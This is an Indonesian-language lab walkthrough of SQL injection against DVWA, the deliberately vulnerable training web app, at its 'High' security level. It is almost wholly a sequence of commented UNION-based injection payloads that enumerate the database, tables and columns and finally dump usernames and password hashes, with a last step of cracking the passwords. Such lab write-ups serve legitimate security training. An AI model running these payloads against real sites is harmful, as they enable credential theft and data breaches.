# SQL Injection DVWA Level High

## Langkah - langkah serangan

### Tahap pertama
```sql
# Perintah ini untuk mengecek apakah suatu web memiliki kerentanan SQL Injection.
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' AND 1=1#
```

### Tahap Kedua
```sql
# Perintah ini untuk mengecek ada siapa saja user yang terdapat di web DVWA
# Merupakan ekspresi logika yang selalu benar.
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' OR 1=1#
```

### Tahap Ketiga
```sql
# Perintah ini digunakan untuk menampilkan ada berapa saja jumlah kolom yang ada
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' ORDER BY 3 #
```

### Tahap Keempat
```sql
# Perintah ini digunakan untuk menampilkan nama database yang digunakan serta versi dari database nya
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' UNION SELECT USER(), DATABASE()#
```

### Tahap Kelima
```sql
# Perintah ini digunakan untuk menampilkan nama database yang digunakan serta versi dari database nya
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' UNION SELECT VERSION(), DATABASE()#
```

### Tahap Keenam
```sql
# Perintah ini digunakan untuk menampilkan semua nama tabel
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' UNION SELECT 1,table_name FROM information_schema.tables#
```

### Tahap Ketujuh
```sql
# Perintah ini digunakan untuk menampilkan semua nama tabel yang terdapat di dalam database dvwa
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 'dvwa'#
```

### Tahap Kedelapan
```sql
# Perintah ini digunakan untuk menampilkan semua columns yang terdapat di dalam tabel users(0x7573657273)
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users'#
```

### Tahap Kesembilan
```sql
# Perintah ini digunakan untuk menampilkan semua user dan password yang terdapat di dalam tabel users
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
1' UNION SELECT user , password FROM users#
```

### Tahap Terakhir
```sql
# Lakukan cracking password
```